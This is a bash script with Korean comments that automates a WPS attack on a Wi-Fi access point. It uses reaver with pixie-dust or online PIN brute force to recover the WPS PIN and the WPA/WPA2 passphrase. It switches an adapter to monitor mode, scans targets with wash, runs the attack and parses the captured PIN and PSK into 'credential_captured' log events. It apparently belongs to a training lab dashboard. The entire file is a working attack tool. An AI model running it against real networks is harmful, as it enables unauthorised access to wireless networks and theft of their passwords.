#!/usr/bin/env bash
# ============================================================
# et_wps_attack.sh - WPS 공격 (reaver PIN 공격 / pixie-dust)
#
#   WPS(Wi-Fi Protected Setup) 가 켜진 AP 의 8자리 PIN 을 공격해 WPA/WPA2
#   비밀번호(PSK)를 획득한다. 기본은 pixie-dust(오프라인, 빠름)이며, 실패 시
#   온라인 PIN brute(-K 0)로 바꿔 돌릴 수 있다.
#
#   핵심 도구: reaver (+pixiewps), wash(대상 스캔)
#
# 사용 예:
#   sudo bash wps/et_wps_attack.sh                    # 대상 미지정 → WPS AP 스캔 후 종료
#   sudo WPS_BSSID=AA:BB:CC:11:22:33 WPS_CHANNEL=6 bash wps/et_wps_attack.sh
#   sudo WPS_PIXIE=0 WPS_BSSID=AA:BB:CC:11:22:33 bash wps/et_wps_attack.sh   # 온라인 PIN brute
#   sudo interface=wlan1 WPS_BSSID=... bash wps/et_wps_attack.sh
#
# 종료: Ctrl+C (reaver 종료 + 인터페이스 managed 복구 + attack_stop 기록)
# ============================================================
set -u

_script_dir="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
# et_config.conf / et_logger.sh 는 스크립트와 같은 폴더 또는 상위(프로젝트 루트)에 있다.
[ -f "${_script_dir}/et_config.conf" ] || _script_dir="${_script_dir}/.."
_config_file="${_script_dir}/et_config.conf"

_cli_interface="${interface:-}"
if [ -f "${_config_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_config_file}")
fi
[ -n "${_cli_interface}" ] && interface="${_cli_interface}"

# --- 파라미터 (env 로 덮어쓰기 가능) ---
WPS_BSSID="${WPS_BSSID:-${bssid:-}}"                 # 대상 AP BSSID (없으면 wash 스캔)
WPS_CHANNEL="${WPS_CHANNEL:-${channel:-}}"           # 대상 채널 (없으면 reaver 가 탐색)
WPS_PIXIE="${WPS_PIXIE:-1}"                          # 1 = pixie-dust(-K 1), 0 = 온라인 PIN brute
WPS_SCAN_SECS="${WPS_SCAN_SECS:-15}"                 # 대상 미지정 시 wash 스캔 시간(초)

# --- 로거 준비 ---
log_dir="${WFSAT_LOG_DIR:-${log_dir:-/tmp/et_logs}}"
tmpdir="$(mktemp -d)/"
_logger_file="${_script_dir}/et_logger.sh"
if [ -f "${_logger_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_logger_file}")
fi

# --- root 확인 ---
if [ "$(id -u 2>/dev/null || echo 1)" != "0" ]; then
	echo "[!] Root 권한이 필요합니다. sudo 로 실행하세요." >&2
	exit 1
fi

# --- 필수 도구 ---
for _bin in reaver wash iw ip; do
	if ! command -v "${_bin}" > /dev/null 2>&1; then
		echo "[!] '${_bin}' 를 찾을 수 없습니다.  Install: sudo apt update && sudo apt install -y reaver pixiewps" >&2
		exit 1
	fi
done
if [ "${WPS_PIXIE}" = "1" ] && ! command -v pixiewps > /dev/null 2>&1; then
	echo "[!] pixiewps 가 없어 온라인 PIN brute 로 전환합니다 (WPS_PIXIE=0)." >&2
	WPS_PIXIE=0
fi

# --- 인터페이스 자동 배정(대화형 없음): 2번째 무선 어댑터 우선, 하나뿐이면 그거 ---
if [ -z "${interface:-}" ]; then
	declare -a _wifaces=()
	for _d in /sys/class/net/*/; do
		_nm=$(basename "${_d}")
		[ -d "/sys/class/net/${_nm}/wireless" ] && _wifaces+=("${_nm}")
	done
	echo "[*] 감지된 무선 어댑터(순서대로): ${_wifaces[*]:-(없음)}"
	if [ "${#_wifaces[@]}" -eq 0 ]; then
		echo "[!] 무선 인터페이스를 찾을 수 없습니다." >&2
		exit 1
	elif [ "${#_wifaces[@]}" -eq 1 ]; then
		interface="${_wifaces[0]}"
	else
		interface="${_wifaces[1]}"
	fi
	echo "[*] WPS 인터페이스 자동 선택: ${interface}"
fi

if [ ! -d "/sys/class/net/${interface}/wireless" ]; then
	echo "[!] '${interface}' 는 무선 인터페이스가 아닙니다." >&2
	exit 1
fi

# --- 정리용 전역 ---
_reaver_pid=""
_parse_pid=""
_reaver_log="${tmpdir}reaver.log"

_cleanup() {
	echo
	echo "[*] WPS 공격 종료 중…"
	[ -n "${_parse_pid}" ] && kill "${_parse_pid}" 2>/dev/null
	[ -n "${_reaver_pid}" ] && kill "${_reaver_pid}" 2>/dev/null
	# 인터페이스 managed 모드 복구
	ip link set "${interface}" down > /dev/null 2>&1
	iw "${interface}" set type managed > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1
	command -v nmcli > /dev/null 2>&1 && nmcli dev set "${interface}" managed yes > /dev/null 2>&1
	if command -v log_finalize > /dev/null 2>&1; then
		log_finalize 2>/dev/null || true
	fi
	rm -rf "${tmpdir}" 2>/dev/null
	echo "[+] 정리 완료."
}
trap _cleanup EXIT INT TERM

# --- 모니터 모드 전환 ---
echo "[*] '${interface}' 를 monitor 모드로 전환합니다…"
command -v nmcli > /dev/null 2>&1 && nmcli dev set "${interface}" managed no > /dev/null 2>&1
ip link set "${interface}" down > /dev/null 2>&1
iw "${interface}" set type monitor > /dev/null 2>&1
ip link set "${interface}" up > /dev/null 2>&1
[ -n "${WPS_CHANNEL}" ] && iw dev "${interface}" set channel "${WPS_CHANNEL}" > /dev/null 2>&1
_mode=$(iw "${interface}" info 2>/dev/null | awk '/type/{print $2}')
if [ "${_mode}" != "monitor" ]; then
	echo "[!] ${interface} 를 monitor 모드로 전환하지 못했습니다. (sudo airmon-ng check kill 필요할 수 있음)" >&2
	exit 1
fi

# --- 대상 BSSID 미지정 → wash 로 WPS AP 스캔 후 종료 안내 ---
if [ -z "${WPS_BSSID}" ]; then
	echo "[*] 대상 BSSID 가 없어 WPS 활성 AP 를 ${WPS_SCAN_SECS}초 스캔합니다…"
	echo "    (BSSID/CH    RSSI  WPS잠금  버전  ESSID)"
	timeout "${WPS_SCAN_SECS}" wash -i "${interface}" 2>/dev/null
	echo
	echo "[*] 위 목록에서 대상 BSSID/채널을 골라 다시 실행하세요:"
	echo "    sudo WPS_BSSID=<BSSID> WPS_CHANNEL=<CH> bash wps/et_wps_attack.sh"
	exit 0
fi

# --- reaver 옵션 구성 ---
_reaver_opts=(-i "${interface}" -b "${WPS_BSSID}" -vv)
[ -n "${WPS_CHANNEL}" ] && _reaver_opts+=(-c "${WPS_CHANNEL}")
if [ "${WPS_PIXIE}" = "1" ]; then
	_reaver_opts+=(-K 1)                          # pixie-dust(오프라인)
	echo "[*] WPS pixie-dust 공격 시작: reaver -b ${WPS_BSSID} -K 1"
else
	echo "[*] WPS 온라인 PIN brute 시작: reaver -b ${WPS_BSSID}"
fi

# --- reaver 실행 (출력은 로그로) ---
reaver "${_reaver_opts[@]}" > "${_reaver_log}" 2>&1 &
_reaver_pid=$!
sleep 1
if ! kill -0 "${_reaver_pid}" 2>/dev/null; then
	echo "[!] reaver 실행 실패. 로그:" >&2
	sed 's/^/    /' "${_reaver_log}" >&2
	exit 1
fi

# --- 로그 시작 (대시보드 실습 탭 연동) ---
essid="${essid:-WPS 대상}"
bssid="${WPS_BSSID}"
if [ "${WPS_PIXIE}" = "1" ]; then
	et_dos_attack="WPS (pixie-dust)"
else
	et_dos_attack="WPS (PIN brute)"
fi
channel="${WPS_CHANNEL:-0}"
if command -v log_init > /dev/null 2>&1; then
	log_init
fi

# --- reaver 출력 파싱: WPS PIN / WPA PSK 획득 시 credential_captured 기록 ---
(
	_seen_pin=0
	_seen_psk=0
	tail -n0 -F "${_reaver_log}" 2>/dev/null | while IFS= read -r _line; do
		if [ "${_seen_pin}" -eq 0 ] && [[ "${_line}" =~ WPS\ PIN:?[[:space:]]*\'?([0-9]{4,})\'? ]]; then
			_seen_pin=1
			_pin="${BASH_REMATCH[1]}"
			command -v _log_event > /dev/null 2>&1 && \
				_log_event "credential_captured" "{\"credential_type\":\"WPS PIN\",\"value\":\"${_pin}\",\"username_context\":\"${WPS_BSSID}\"}"
			echo "[+] WPS PIN 획득: ${_pin}"
		fi
		if [ "${_seen_psk}" -eq 0 ] && [[ "${_line}" =~ WPA\ PSK:?[[:space:]]*\'(.*)\'[[:space:]]*$ ]]; then
			_seen_psk=1
			_psk="${BASH_REMATCH[1]}"
			command -v _log_event > /dev/null 2>&1 && \
				_log_event "credential_captured" "{\"credential_type\":\"WPA PSK\",\"value\":\"${_psk}\",\"username_context\":\"${WPS_BSSID}\"}"
			echo "[+] WPA PSK 획득: ${_psk}"
		fi
	done
) &
_parse_pid=$!

echo "[+] WPS 공격 진행 중. PIN/PSK 를 찾으면 실습 탭 이벤트에 기록됩니다."
echo "    (진행 로그: tail -f ${_reaver_log})"
echo "    (종료하려면 Ctrl+C)"

# --- 메인 루프: reaver 가 살아있는 동안 상태 갱신 ---
while kill -0 "${_reaver_pid}" 2>/dev/null; do
	if command -v _log_update_summary > /dev/null 2>&1; then
		_log_update_summary 2>/dev/null || true
	fi
	sleep 5
done

echo "[*] reaver 가 종료되었습니다. 결과 로그:"
sed 's/^/    /' "${_reaver_log}" 2>/dev/null | tail -n 20
